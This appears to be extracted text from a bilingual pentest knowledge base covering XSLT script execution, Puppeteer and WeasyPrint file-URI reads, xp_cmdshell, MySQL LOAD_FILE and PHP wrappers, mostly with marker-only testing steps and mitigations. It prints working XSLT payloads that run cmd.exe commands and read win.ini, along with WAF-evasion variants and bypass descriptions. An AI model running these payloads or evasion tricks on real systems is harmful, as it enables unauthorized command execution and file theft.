description.zh: 使用同一固定 XML，记录编译、调用和输出差异。
description.en: Use the same fixed XML and record compilation, invocation, and output differences.

attackChain.payload:
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <msxsl:script language="C#" implements-prefix="user">
    public string exec() {
      System.Diagnostics.Process p = System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "";
  </msxsl:script>
    <xsl:value-of select="user:exec()"/>

title.zh: 关联命名空间函数与 Marker
title.en: Correlate the namespace function and marker

description.zh: 确认输出来自 user:exec() 的受控返回，而非输入回显。
description.en: Confirm output comes from the controlled user:exec() return rather than input reflection.

description.zh: 修复后普通 XSLT 保持可用，脚本块在编译或调用前被拒绝。
description.en: After remediation preserve ordinary XSLT while rejecting script blocks before compilation or invocation.

prerequisites.zh: 明确目标 .NET/XSLT 实现、版本与 EnableScript 设置，并保存禁用脚本的解析基线
prerequisites.en: The target .NET/XSLT implementation, version, and EnableScript setting are known and a script-disabled parse baseline is preserved.

prerequisites.zh: 原 Process.Start 块在执行前替换为只返回随机常量的受控 C# 函数，且补齐 template 与 stylesheet 闭合标签
prerequisites.en: Before execution the original Process.Start block is replaced with a controlled C# function that only returns a random constant, and valid template and stylesheet closing tags are added.

analysis.zh: 这是一段必须整体保留的结构片段，不是七个独立 payload。有效阳性是补齐后的无副作用样式表仅在启用脚本时返回随机 marker；编译错误、namespace URL、select 属性或 Process 文本均不能证明执行。
analysis.en: This is one structural fragment that must remain intact, not seven independent payloads. A valid positive is a completed side-effect-free stylesheet returning a random marker only when scripting is enabled; compile errors, namespace URLs, the select attribute, or Process text do not prove execution.

opsecTips.zh: 绝不运行来源中的 cmd.exe/whoami；验证函数只能返回进程内随机常量且不得调用文件、网络或子进程 API
opsecTips.en: Never run the source cmd.exe/whoami call; the validation function may only return an in-process random constant and must not call file, network, or child-process APIs.

opsecTips.zh: 转换器使用低权限一次性进程、固定小 XML 和短超时，测试后删除编译缓存与输出
opsecTips.en: Use a low-privilege disposable transformer process, fixed small XML, and a short timeout, then delete compilation caches and output.

wafBypass.command: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:u="urn:x"><msxsl:script implements-prefix="u" language="JScript">function r(){var p=new ActiveXObject('WScript.Shell');return p.Exec('cmd /c id').StdOut.ReadAll();}</msxsl:script></xsl:stylesheet>

description.zh: 改用 JScript + WScript.Shell COM 对象，绕过 C#/Process.Start 特征；成功判据：Exec 返回命令输出。
description.en: Uses JScript with the WScript.Shell COM object to evade C#/Process.Start signatures. Success: Exec returns command output.

wafBypass.command: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:t="urn:t"><ms:script implements-prefix="t" language="C#">public string Run(){return System.Diagnostics.Process.Start("cmd.exe","/c "+Environment.GetEnvironmentVariable("CM")).StandardOutput.ReadToEnd();}</ms:script></xsl:stylesheet>

description.zh: msxsl 前缀重命名为 ms 并从环境变量取命令，规避固定前缀与明文命令；成功判据：设置 CM=id 后返回输出。
description.en: Renames the msxsl prefix to ms and pulls the command from an environment variable, evading fixed prefixes and plaintext commands. Success: with CM=id set, output is returned.

wafBypass.command: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:c="urn:c"><msxsl:script implements-prefix="c" language="C#">public string E(){string m="Y2F0IGM6XFx3aW5kb3dzXFx3aW5pbmk=";byte[] b=Convert.FromBase64String(m);string s=Text.Encoding.UTF8.GetString(b);return Diagnostics.Process.Start("cmd.exe","/c "+s).StandardOutput.ReadToEnd();}</msxsl:script></xsl:stylesheet>

description.zh: 命名空间截断（Text./Diagnostics.）+ 命令 base64，多重规避特征；成功判据：返回 win.ini 内容。
description.en: Truncated namespaces (Text./Diagnostics.) plus a base64 command provide layered evasion. Success: win.ini contents returned.

name.zh: Puppeteer 本地 File URI 读取边界

description.zh: 归并 fetch 与同步 XMLHttpRequest 的 file URI 变体，验证无头 Chromium 的页面来源和启动策略是否允许读取渲染主机文件。
description.en: Groups fetch and synchronous XMLHttpRequest file-URI variants to test whether headless Chromium page origin and launch policy permit reads from renderer-host files.

overview.zh: Puppeteer 本地 File URI 读取边界针对无头 Chromium 渲染页面可否读取宿主文件的场景：取决于页面来源、启动策略与沙箱权限。验证 fetch 与同步 XHR 两类 file URI 变体，测试仅指向 marker 文件。
overview.en: The Puppeteer local file-URI read boundary targets whether headless Chromium rendering pages can read host files, depending on page origin, launch policy, and sandbox permissions. It validates fetch and synchronous-XHR file-URI variants, testing only against marker files.

vulnerability.zh: 若攻击者控制渲染页面脚本且浏览器可读取宿主文件，内容可能进入 title 或其他返回通道；错误中出现路径、请求被创建或文件存在性信号均不等于读取内容。
vulnerability.en: If an attacker controls rendered page scripts and the browser can read host files, content may leak into title or other return channels; paths appearing in errors, requests being created, or file-existence signals do not equal content reads.

exploitation.zh: 按第 1 步保留两条原始行作追溯，实际执行时把 URI 改为临时 marker.txt：先用 fetch 读取并把结果写入 document.title，再用同步 XMLHttpRequest 重复同一读取；命中判据为 title 或回传通道出现 marker 内容，证明 file URI 可被页面脚本读取。分别记录浏览器启动参数、页面来源与读取结果；读取失败要区分策略拦截与文件不存在。
exploitation.en: Keep the two original lines from step 1 for traceability but point the URI at a temp marker.txt when executing: first read via fetch and write the result into document.title, then repeat the same read with synchronous XMLHttpRequest; a hit is marker content in title or the return channel, proving page scripts can read file URIs. Record launch flags, page origin, and read results separately; distinguish policy blocks from missing files on failure.

mitigation.zh: 禁用本地文件访问启动选项，把渲染器放入只含工作目录的只读沙箱，并在输入规范化后拒绝 file scheme；避免把任意页面输出直接返回。修复后重放第 1 步变体，确认 file URI 读取被拒绝且正常渲染可用。
mitigation.en: Disable local-file-access launch options, place the renderer in a read-only sandbox containing only the working directory, and reject the file scheme after input normalization; never return arbitrary page output directly. After the fix, replay the step-1 variants and confirm file-URI reads are rejected while normal rendering works.

description.zh: 在临时挂载写入一次性随机值并开启浏览器进程文件审计。
description.en: Write a one-time random value in a temporary mount and enable file auditing for the browser process.

title.en: Rewrite the path and test the APIs

description.zh: 逐一运行 fetch 与 XHR，对每次渲染使用新 Profile。
description.en: Run fetch and XHR one at a time using a fresh profile for every render.

description.zh: 关联文件打开、读取字节和 title 标记，排除仅路径解析。
description.en: Correlate file open, bytes read, and title marker and exclude path parsing alone.

description.zh: 修复后确认 marker 在打开前被拒绝且普通内联页面仍可渲染。
description.en: After remediation confirm marker access is rejected before open while ordinary inline pages still render.

prerequisites.zh: 原 `/etc/passwd` 路径在执行前替换为渲染沙箱内只含随机标记的临时文件
prerequisites.en: The original /etc/passwd path is replaced before execution with a temporary marker-only file inside the rendering sandbox.

prerequisites.zh: Chromium 使用临时 Profile 和最小文件权限，文件审计可区分 URI 解析、打开与内容读取
prerequisites.en: Chromium uses a temporary profile and minimal file permissions, with file audit distinguishing URI parsing, open, and content read.

analysis.zh: 浏览器文件读取审计和返回通道中的同一标记共同构成阳性。file URI 出现在 DOM、控制台错误或请求对象中只证明输入被解析，不能证明宿主文件泄露。
analysis.en: Browser file-read audit plus the same marker in the return channel constitutes a positive. A file URI in the DOM, console error, or request object proves parsing only, not host-file disclosure.

opsecTips.zh: 绝不指向系统文件、密钥或宿主挂载，只使用自动销毁的单行 marker 文件
opsecTips.en: Never target system files, keys, or host mounts; use only an automatically destroyed one-line marker file.

opsecTips.zh: 测试进程无管理员权限、无网络并设置文件读取配额，首次成功读取后立即停止
opsecTips.en: Run without administrator rights or networking, enforce a file-read quota, and stop after the first successful read.

description.zh: 查询串干扰 file:// 匹配。判据：标题显示 passwd 内容。
description.en: Query string alters the signature. Success: title shows passwd.

description.zh: 显式 localhost 等价读取。判据：内容回显。
description.en: Explicit localhost form. Success: content echoed.

description.zh: XHR 路径绕过 fetch 特征。判据：标题含内容。
description.en: XHR path avoids fetch signatures. Success: title contains content.

name.zh: WeasyPrint File URI 子资源边界

description.zh: 归并样式表与 SVG image 的 file URI 变体，验证 WeasyPrint URL fetcher 和渲染身份对本地文件的访问范围。
description.en: Groups stylesheet and SVG image file-URI variants to test the local-file reach of the WeasyPrint URL fetcher and rendering identity.

overview.zh: WeasyPrint File URI 子资源边界针对渲染引擎 fetcher 对本地文件访问范围的场景：样式表与 SVG image 均可引用 file URI。验证 CSS link 与 SVG image 两类引用能否读到 marker 资源。
overview.en: The WeasyPrint file-URI subresource boundary targets the rendering engine's fetcher scope for local files: stylesheets and SVG images can both reference file URIs. It validates whether CSS link and SVG image references can read marker resources.

vulnerability.zh: 不可信文档若能引用渲染主机文件，可能通过呈现结果或错误侧信道暴露内容；路径被接受、文件存在或格式解析错误不等于内容已泄露。
vulnerability.en: If untrusted documents can reference renderer-host files, content may leak through rendered results or error side channels; accepted paths, file existence, or format-parse errors do not equal leaked content.

exploitation.zh: 按第 1 步保留两条原始引用作追溯，实际执行前把路径分别改为最小 marker.css 与 marker.png：先以 link 样式表引用触发 fetcher 读取，再以 SVG image 引用重复；命中判据为渲染结果或错误信息携带 marker 内容特征，证明 file URI 进入 fetcher。分别记录 fetcher 定制、base URL 与渲染身份的文件权限；确认读取能力后再评估越出资源根的可行性。
exploitation.en: Keep the two original references from step 1 for traceability, but before executing change the paths to a minimal marker.css and marker.png: first trigger fetcher reads via a link stylesheet, then repeat via an SVG image reference; a hit is rendered output or error messages carrying marker-content characteristics, proving file URIs reach the fetcher. Record fetcher customization, base URL, and renderer-identity file permissions separately; after confirming read capability, assess escaping the resource root.

mitigation.zh: 自定义 fetcher 拒绝 file scheme 或仅允许规范化后的专用资源根目录，同时以无宿主挂载的低权限容器运行渲染器。修复后重放第 1 步两类引用，确认 file URI 被拒绝且正常渲染可用。
mitigation.en: Customize the fetcher to reject the file scheme or allow only a normalized dedicated resource root, and run the renderer in a low-privilege container without host mounts. After the fix, replay both step-1 reference classes and confirm file URIs are rejected while normal rendering works.

description.zh: 创建最小 CSS 与图片文件并记录哈希，另设不存在路径。
description.en: Create minimal CSS and image files, record their hashes, and define a missing path.

title.zh: 改写 URI 后逐条渲染

description.zh: 每次只引用一种 marker，保存文件审计和输出哈希。
description.en: Reference one marker type per run and preserve file audit and output hash.

description.zh: 要求读取字节和文档效果同时出现，并与缺失文件对照。
description.en: Require both bytes read and document effect and compare with the missing-file control.

title.en: Restrict the asset root and clean up

description.zh: 修复后保留批准资产，拒绝目录外 marker，再删除临时文件。
description.en: After remediation preserve approved assets, reject the out-of-root marker, and delete temporary files.

prerequisites.zh: 原系统路径替换为渲染沙箱中分别包含最小 CSS 和图片的临时 marker 文件
prerequisites.en: The original system path is replaced with temporary marker files containing minimal CSS and image data inside the rendering sandbox.

prerequisites.zh: 渲染身份无宿主挂载权限，文件审计覆盖 URL fetcher 的 open/read 事件
prerequisites.en: The rendering identity has no host-mount permission and file audit covers URL-fetcher open and read events.

analysis.zh: 阳性需要 WeasyPrint 进程读取临时 marker 并在输出中产生可解释效果。URI 被解析、文件 open 失败或解析器报告格式错误只能证明到达某层边界。
analysis.en: A positive requires the WeasyPrint process to read the temporary marker and produce an attributable output effect. URI parsing, a failed file open, or a format error proves only that a particular boundary was reached.

opsecTips.zh: 只挂载自动生成的 marker 目录，绝不暴露 `/etc`、用户目录、密钥或应用配置
opsecTips.en: Mount only the generated marker directory and never expose /etc, user directories, keys, or application configuration.

opsecTips.zh: 限制单次读取大小和文件数量，渲染完成后卸载目录并销毁输出
opsecTips.en: Limit bytes and file count per run, then unmount the directory and destroy output after rendering.

description.zh: CSS import 读本地文件。判据：渲染结果或错误包含内容。
description.en: CSS import reads the file. Success: render output contains content.

description.zh: 框架引用本地文件。判据：PDF 中出现内容或错误回显。
description.en: Frame references the local file. Success: content or error leaks into the PDF.

description.zh: 行内样式触发读取。判据：资源加载日志可见。
description.en: Inline style triggers the fetch. Success: fetch visible in resource logs.

name.zh: SQL Server xp_cmdshell 影响验证

description.zh: 使用 xp_cmdshell 命令与文件读取样例验证堆叠 SQL 注入是否跨越到 SQL Server 主机进程执行。
description.en: Uses xp_cmdshell command and file-read samples to test whether stacked SQL injection crosses into SQL Server host-process execution.

overview.zh: SQL Server xp_cmdshell 影响验证针对堆叠 SQL 注入跨越到数据库主机进程执行的场景。验证注入会话能否调用 xp_cmdshell 并由 SQL Server 服务身份启动受控子进程，样例以固定标记命令替换。
overview.en: SQL Server xp_cmdshell impact validation targets stacked SQL injection crossing into database-host process execution. It validates whether the injection session can invoke xp_cmdshell and spawn a controlled child process under the SQL Server service identity, with samples replaced by fixed marker commands.

vulnerability.zh: 链条需要 SQL 注入控制语句、调用账户具备 EXEC 权限、xp_cmdshell 已启用或可被启用，并且服务身份拥有系统能力；每项都是独立边界，服务账户权限决定最终影响。
vulnerability.en: The chain requires injection-controlled statements, an account with EXEC permission, xp_cmdshell enabled or enableable, and a service identity with system capability; each is an independent boundary, and the service account's permissions determine final impact.

exploitation.zh: 先注入普通语句确认堆叠执行与调用账户权限，再按第 1 步提交 xp_cmdshell 样例，真实验证时把 whoami/type 替换为只输出随机固定标记和读取专用标记文件的命令并只执行一次；命中判据为查询返回标记输出，证明数据库会话跨越到主机进程执行。xp_cmdshell 被禁用时记录错误信息，尝试启用需在明确授权范围内进行并保留配置变更审计。
exploitation.en: First confirm stacked execution and the calling account's permissions with ordinary injected statements, then submit the xp_cmdshell samples per step 1—for real validation replace whoami/type with commands that only emit a random fixed marker and read a dedicated marker file, executing once; a hit is the marker output returned by the query, proving the database session crossed into host-process execution. If xp_cmdshell is disabled, record the error; attempting enablement requires explicit authorization with configuration-change auditing.

mitigation.zh: 参数化查询，应用数据库账户不授予高权限角色或扩展过程执行，保持 xp_cmdshell 禁用并监控配置变更；SQL Server 使用专用低权限服务账户，限制子进程和出站网络。修复后重放第 1 步样例，确认调用被拒绝且配置变更触发告警。
mitigation.en: Use parameterized queries, grant the application's database account no high-privilege roles or extended-procedure execution, keep xp_cmdshell disabled, and monitor configuration changes; run SQL Server under a dedicated low-privilege service account with restricted child processes and egress. After the fix, replay the step-1 samples and confirm invocation is denied and configuration changes trigger alerts.

title.zh: 审计扩展过程配置与权限

description.zh: 只读检查 xp_cmdshell 是否启用、调用主体和 SQL Server 服务身份。
description.en: Read-only inspect whether xp_cmdshell is enabled, the calling principal, and SQL Server service identity.

title.zh: 执行单次固定标记命令

description.zh: 在一次性实例将原命令改为固定标记输出，并保留数据库与进程审计。
description.en: In a disposable instance replace the original command with fixed marker output and retain database and process audit.

title.zh: 确认 SQL Server 子进程
title.en: Confirm the SQL Server child process

description.zh: 匹配请求、SQL 审计、服务身份、子进程和固定输出，排除静态错误。
description.en: Match request, SQL audit, service identity, child process, and fixed output, excluding static errors.

description.zh: 修复注入、撤销扩展过程权限并确认禁用后重放，确保无子进程。
description.en: Fix injection, revoke procedure privilege, verify disablement, and replay to ensure no child process.

prerequisites.zh: 仅在一次性 SQL Server 实验实例验证并已确认 SQL 注入
prerequisites.en: Testing occurs only on a disposable SQL Server lab after SQL injection is confirmed.

prerequisites.zh: 使用固定标记命令和无敏感文件，且可审计子进程
prerequisites.en: Fixed marker commands and nonsensitive files are used with child-process auditing.

analysis.zh: 应分别证明注入、过程调用权限、启用状态和操作系统子进程。xp_cmdshell 被禁用的错误只说明产品特征，不是可利用 RCE。
analysis.en: Prove injection, procedure privilege, enabled state, and OS child process separately. A disabled xp_cmdshell error is a product signal, not exploitable RCE.

opsecTips.zh: 只在一次性实例运行固定标记，不读取 hosts 或执行 whoami 原命令。
opsecTips.en: Use a fixed marker only in a disposable instance; do not run the original whoami or hosts read.

opsecTips.zh: 不启用 xp_cmdshell 作为测试步骤；若默认禁用，记录并停止。
opsecTips.en: Do not enable xp_cmdshell for testing; if it is disabled by default, record that and stop.

description.zh: 绕过对 whoami 明文的 SQL 层/WAF 拦截：用 CHAR() 逐字符拼出命令；成功判据：返回当前用户名行。
description.en: Evades blocking of the literal whoami by assembling it from CHAR() codes. Success: a row with the current username is returned.

description.zh: /**/ 内联注释打断关键词组合、大小写绕过大小写敏感规则；成功判据：命令输出回显。
description.en: Inline /**/ comments break keyword adjacency and mixed case defeats case-sensitive rules. Success: command output reflected.

description.zh: 命令以 nvarchar 十六进制字面量传入，绕过引号与明文检测；成功判据：whoami 输出回显。
description.en: Passes the command as an nvarchar hex literal to evade quote and plaintext detection. Success: whoami output reflected.

name.zh: MySQL LOAD_FILE 文件读取影响

description.zh: 使用 Linux 与 Windows 路径的 LOAD_FILE 查询验证 SQL 注入是否可借数据库账户读取主机文件。
description.en: Uses LOAD_FILE queries for Linux and Windows paths to test whether SQL injection can read host files through database privileges.

overview.zh: MySQL LOAD_FILE 文件读取影响针对 SQL 注入借数据库账户读取主机文件的场景：读取发生在数据库节点而非应用主机。验证 Linux 与 Windows 路径的 LOAD_FILE 查询在 FILE 权限与 secure_file_priv 约束下的行为。
overview.en: MySQL LOAD_FILE file-read impact targets SQL injection reading host files via the database account: reads happen on the database node, not the application host. It validates LOAD_FILE queries against Linux and Windows paths under FILE-privilege and secure_file_priv constraints.

vulnerability.zh: 链条需要 SQL 注入控制查询、应用数据库账户拥有 FILE 权限、目标位于允许目录且 mysqld 身份可读；若数据库和应用分离，读取范围属于数据库节点。NULL 结果可能是安全配置或路径不存在，不能从错误推断任意读取。
vulnerability.en: The chain requires injection-controlled queries, an application database account with FILE privilege, the target inside allowed directories readable by the mysqld identity; with separated database and application hosts, reads are scoped to the database node. NULL results may be safe configuration or missing paths—errors alone cannot establish arbitrary reads.

exploitation.zh: 按第 1 步按数据库主机平台选择 Linux 或 Windows 路径样例，并把系统目标替换为容器中的专用标记文件后经注入点提交；命中判据为查询返回标记文件内容，证明 LOAD_FILE 读取成立。返回 NULL 时依次核对 FILE 权限、secure_file_priv 配置与文件可读性，分别记录原因；不要读取真实账户或系统配置文件。
exploitation.en: Per step 1, choose the Linux or Windows path sample by database-host platform, replace system targets with dedicated marker files in the container, and submit through the injection point; a hit is the query returning marker-file content, proving LOAD_FILE reads work. On NULL, check FILE privilege, secure_file_priv, and file readability in turn, recording each cause; never read real account or system configuration files.

mitigation.zh: 修复注入并从应用账户移除 FILE 权限，配置 secure_file_priv 为专用不可达目录或禁用，数据库容器使用最小只读文件系统并与应用文件系统隔离，同时监控 LOAD_FILE 调用。修复后重放第 1 步查询，确认返回 NULL 且审计记录调用。
mitigation.en: Fix the injection, revoke FILE privilege from the application account, set secure_file_priv to a dedicated unreachable directory or disable it, run the database container on a minimal read-only filesystem isolated from the application, and monitor LOAD_FILE calls. After the fix, replay the step-1 queries and confirm NULL results with audit records.

title.zh: 审计 MySQL 文件边界

description.zh: 只读检查账户 FILE 权限、secure_file_priv 和 mysqld 可读测试目录。
description.en: Read-only inspect FILE privilege, secure_file_priv, and a test directory readable by mysqld.

description.zh: 按平台选择一行并替换为标记路径，只执行一次。
description.en: Choose one platform-matching line, replace it with the marker path, and execute once.

title.zh: 确认 mysqld 文件访问

description.zh: 匹配查询审计、进程文件访问和固定标记，不从 NULL/错误推断。
description.en: Match query audit, process file access, and fixed marker without inferring from NULL or errors.

title.zh: 撤销 FILE 权限并回归

description.zh: 修复查询和文件权限后重放标记与合法业务查询，确认读取拒绝。
description.en: After query and privilege fixes replay the marker and valid business queries to confirm file read denial.

prerequisites.zh: 仅在隔离 MySQL 容器和已确认注入后评估文件权限
prerequisites.en: Filesystem privilege is assessed only in an isolated MySQL container after injection is confirmed.

prerequisites.zh: 测试目录提供无敏感标记并可审计数据库文件访问
prerequisites.en: A test directory provides a nonsensitive marker with database file-access auditing.

analysis.zh: 明确数据库主机、应用主机和文件来源。最强证据是 mysqld 读取专用标记；错误、NULL 或应用层文件内容都需要进一步归因。
analysis.en: Identify database host, application host, and file source. Strong evidence is mysqld reading the dedicated marker; errors, NULL, or application-tier content require further attribution.

opsecTips.zh: 禁止读取 passwd、shadow 或 hosts；只使用固定标记文件。
opsecTips.en: Never read passwd, shadow, or hosts; use only a fixed marker file.

opsecTips.zh: 只执行一次并立即删除标记，保留哈希和审计事件即可。
opsecTips.en: Execute once, remove the marker immediately, and retain only its hash and audit event.

description.zh: 路径十六进制绕过引号与路径检测。判据：返回 passwd 内容。
description.en: Hex path evades quote/path rules. Success: passwd returned.

description.zh: 拆分路径绕过整串匹配。判据：内容返回。
description.en: Split path evades whole-string matching. Success: content returned.

description.zh: UNHEX 解码路径。判据：读取成功。
description.en: UNHEX decodes the path. Success: read succeeds.

name.zh: PHP stdin、memory 与 temp 运行时流边界
name.en: PHP stdin, memory, and temp Runtime Stream Boundaries

description.zh: 验证文件型输入点是否接受 php://stdin、php://memory 与 php://temp，并区分进程标准输入、内存临时流和普通文件读取。
description.en: Tests whether a file-oriented sink accepts php://stdin, php://memory, or php://temp and distinguishes process input, in-memory temporary streams, and ordinary file reads.

subCategory.zh: 运行时流与包装器综合

overview.zh: PHP stdin、memory 与 temp 运行时流边界针对文件型输入点接受 PHP 运行时流的场景：stdin 引用进程标准输入，memory/temp 创建临时流。验证三类 wrapper 在已确认读取 API 中的语义差异。
overview.en: PHP stdin, memory, and temp runtime stream boundaries target file-type input points accepting PHP runtime streams: stdin references process standard input while memory/temp create temporary streams. It validates semantic differences of the three wrappers in confirmed read APIs.

vulnerability.zh: 根因是业务把用户提供的 URI 交给通用 stream API，并在读取/包含之间没有固定语义；若 stdin 的请求体被 include，数据可跨入代码，若只是读取新建空 memory/temp，通常没有影响。
vulnerability.en: The root cause is business logic handing user-provided URIs to generic stream APIs without fixed read/include semantics; if stdin's request body is included, data crosses into code, while reading freshly created empty memory/temp streams is usually harmless.

exploitation.zh: 按第 1 步把 php://stdin、php://memory、php://temp 逐条用于已确认的读取 API；stdin 验证时请求体只放固定文本，命中判据为响应返回该文本，证明进程标准输入被读取。memory/temp 通常是进程内新流，空结果可能是预期而非漏洞，需结合目标 API 是否 include 内容判断；三类 wrapper 的结果分别记录，不合并结论。
exploitation.en: Apply php://stdin, php://memory, and php://temp to the confirmed read API one by one per step 1; for stdin put only fixed text in the request body—a hit is the response returning that text, proving process standard input was read. memory/temp usually create fresh in-process streams, so empty results may be expected rather than vulnerabilities—judge together with whether the target API includes content; record all three wrapper results separately without merging conclusions.

mitigation.zh: 不要让用户选择 wrapper；为每个业务场景调用固定 API 和资源类型；禁止动态 include，请求体作为数据解析，关闭不需要的 wrapper，并以最小权限和资源限制运行 PHP。修复后重放第 1 步三类流 URI，确认被拒绝。
mitigation.en: Never let users choose wrappers; call fixed APIs and resource types per business scenario; forbid dynamic include, parse request bodies as data, disable unneeded wrappers, and run PHP with least privilege and resource limits. After the fix, replay the step-1 stream URIs and confirm rejection.

description.zh: 定位 URI 到具体 PHP stream API，并记录输入体和 wrapper 基线。
description.en: Locate the URI's PHP stream API and record body and wrapper baselines.

title.en: Submit a fixed marker per stream

description.zh: 一次选择一个 URI，stdin 配合纯文本标记，memory/temp 不预填敏感数据。
description.en: Choose one URI at a time, pair stdin with plain marker text, and do not preload sensitive data into memory or temp.

title.zh: 核对实际流与处理结果
title.en: Verify the actual stream and processing result

description.zh: 匹配 wrapper 打开日志、标记输出和是否发生解释，排除空流正常行为。
description.en: Match wrapper-open logs, marker output, and any interpretation, excluding normal empty-stream behavior.

description.zh: 修复后重放合法资源与三种 URI，确认只允许业务指定输入。
description.en: After remediation replay valid resources and all three URIs to confirm only business-specified input is allowed.

prerequisites.zh: 目标 PHP API 接受通用 stream URI，并可观察实际打开的 wrapper
prerequisites.en: The target PHP API accepts generic stream URIs and the opened wrapper can be observed.

prerequisites.zh: 隔离请求体只含固定标记且不触发 include 执行
prerequisites.en: The isolated request body contains only a fixed marker and does not trigger include execution.

analysis.zh: 阳性边界是可控 stdin/流内容被目标读取或解释并改变服务器行为。memory/temp 的空结果和 wrapper 名回显是假阳性，不应按文件包含评级。
analysis.en: The positive boundary is controlled stdin or stream content being consumed or interpreted and changing server behavior. Empty memory or temp output and reflected wrapper names are false positives and should not be rated as file inclusion.

opsecTips.zh: stdin 只放一次随机文本标记，看到后立即停止，不提交 PHP 代码。
opsecTips.en: Place one random text marker in stdin and stop when observed; never submit PHP code.

opsecTips.zh: 测试后关闭请求连接并清理临时目录/进程缓存，确认没有持久文件。
opsecTips.en: Close the request and clear temporary directories or process caches afterward, confirming no persistent file remains.

description.zh: 绕过对 stdin/memory/temp 已列名的过滤：改访问文件描述符 1 输出流；包含行为产生输出即成功。
description.en: Target descriptor 1 instead of the enumerated stdin/memory/temp names; inclusion producing output confirms success.

description.zh: 绕过对 php://temp 固定形式匹配：附加参数改变 URI 形态；流功能仍可用即成功。
description.en: Append a parameter to alter the URI past exact-form matching; the stream still functioning confirms success.

description.zh: 绕过对全小写标准形式匹配：大小写变形加冗余斜杠仍被流层注册；流可打开即成功。
description.en: Mutate case and add redundant slashes, still registered by the stream layer; the stream opening confirms success.

name.zh: PHP data Wrapper 内联内容包含
name.en: PHP data Wrapper Inline Content Inclusion

description.zh: 使用 data:// 与 data: 的 Base64/明文 PHP 内容验证文件包含点是否把内联数据交给 PHP 解释器。
description.en: Uses Base64 and plain PHP content in data:// and data: URIs to test whether a file-inclusion sink passes inline data to the PHP interpreter.

overview.zh: PHP data Wrapper 内联内容包含针对包含点把 data:// 内联数据交给 PHP 解释器的场景：普通读取只返回数据，include/require 才解释代码。验证 Base64 与明文两类内联流在包含入口的行为。
overview.en: PHP data-wrapper inline-content inclusion targets inclusion points handing data:// inline data to the PHP interpreter: ordinary reads return data while include/require interprets code. It validates Base64 and plaintext inline streams at the inclusion entry.

vulnerability.zh: 根因是用户可控制 include 目标且启用了允许 URL include 的配置或等价执行路径；应用未限制 wrapper scheme，导致内联数据从输入跨入 PHP 编译执行。
vulnerability.en: The root cause is user-controlled include targets with URL-include configuration or equivalent execution paths enabled; without wrapper-scheme restrictions, inline data crosses from input into PHP compile-time execution.

exploitation.zh: 按第 1 步保留原始行作来源追溯，实际验证选择一条 data:// 变体并把其解码/明文内容改为 <?php echo 'MARKER'; ?> 后提交到包含入口；命中判据为页面输出 MARKER 标记，证明内联数据被 PHP 编译执行。同时记录 allow_url_include 配置与最终函数语义；不读取文件、不列目录、不执行系统命令。
exploitation.en: Keep the original lines from step 1 for source traceability; for actual validation pick one data:// variant, change its decoded/plaintext content to <?php echo 'MARKER'; ?>, and submit to the inclusion entry; a hit is MARKER output on the page, proving inline data was compiled and executed by PHP. Record the allow_url_include configuration and final function semantics; do not read files, list directories, or run system commands.

mitigation.zh: 禁止动态 include 用户输入，关闭 allow_url_include 并限制可用 wrapper；模板通过服务端 ID 映射，数据流只用解析 API 不交给 PHP 编译器；应用最小权限并监控 data URI 进入 include。修复后重放第 1 步 data 流，确认被拒绝。
mitigation.en: Forbid dynamic inclusion of user input, disable allow_url_include, and restrict available wrappers; map templates via server-side IDs and hand data streams only to parsing APIs, never the PHP compiler; run least-privileged and audit data URIs reaching include. After the fix, replay the step-1 data stream and confirm rejection.

title.zh: 确认 include 与配置前提

description.zh: 定位动态 include/require、allow_url_include 和 PHP 版本。
description.en: Identify dynamic include or require, allow_url_include, and PHP version.

title.zh: 提交单一固定 echo Wrapper

description.zh: 选择一条变体并替换全部危险内容，只输出随机固定标记。
description.en: Choose one variant, replace all dangerous content, and emit only a random fixed marker.

title.zh: 确认 PHP 解释而非数据返回
title.en: Confirm PHP interpretation rather than data return

description.zh: 匹配编译/执行日志和固定输出，排除原样流读取、解码与回显。
description.en: Match compile or execution logs and fixed output, excluding raw stream reads, decoding, and reflection.

title.zh: 关闭 URL Include 并清理
title.en: Disable URL inclusion and clean up

description.zh: 修复后重放合法模板与 data 变体，确认模板保留且内联代码不解释。
description.en: After remediation replay a valid template and data variants to preserve templates while inline code is not interpreted.

prerequisites.zh: 仅在隔离 PHP 实例确认输入进入 include/require 而非普通读取
prerequisites.en: Testing occurs only on an isolated PHP instance after confirming input reaches include or require rather than an ordinary read.

prerequisites.zh: 验证内容改写为固定输出标记且 allow_url_include 配置可审计
prerequisites.en: Validation content is rewritten to fixed marker output and allow_url_include configuration is auditable.

analysis.zh: 阳性必须是修改后的固定 PHP echo 在服务器端执行。原 data URI 被读取或解码、500、源码回显均是假阳性；不得用原危险内容确认。
analysis.en: A positive requires the rewritten fixed PHP echo to execute server-side. Reading or decoding the data URI, a 500, or source reflection are false positives, and the dangerous originals must never be used for confirmation.

opsecTips.zh: 只选择一行并改写为固定 echo，得到标记后立即停止，禁止文件读取/命令执行。
opsecTips.en: Choose one line rewritten to fixed echo and stop after the marker; no file reads or command execution are permitted.

opsecTips.zh: 测试后清理请求日志中的内联内容、opcode 缓存和临时响应。
opsecTips.en: After testing clean inline content from request logs, opcode caches, and temporary responses.

description.zh: 在 ;base64 前插入 charset 参数，绕过 data://text/plain;base64, 精确特征；成功判据：包含后命令参数生效。
description.en: Inserts a charset parameter before ;base64 to evade the exact data://text/plain;base64 signature. Success: the cmd parameter works after inclusion.

description.zh: 不用 base64 而整体百分号编码明文 PHP，规避 base64 检测分支；成功判据：代码被 include 执行。
description.en: Drops base64 entirely and percent-encodes plaintext PHP to evade base64-oriented rules. Success: the code executes via include.

title.zh: filter 嵌套 data 变体

description.zh: 外层 php://filter 解码内层 data 流，绕过对首协议为 data:// 的校验；成功判据：id 输出回显。
description.en: Wraps the data stream in php://filter to evade validators checking the first protocol. Success: id output reflected.

name.zh: Spring Boot Actuator 端点暴露

description.zh: 枚举 Spring Boot Actuator 的管理端点，验证健康、配置、映射、日志和诊断数据是否被错误地公开或授予低权限主体。
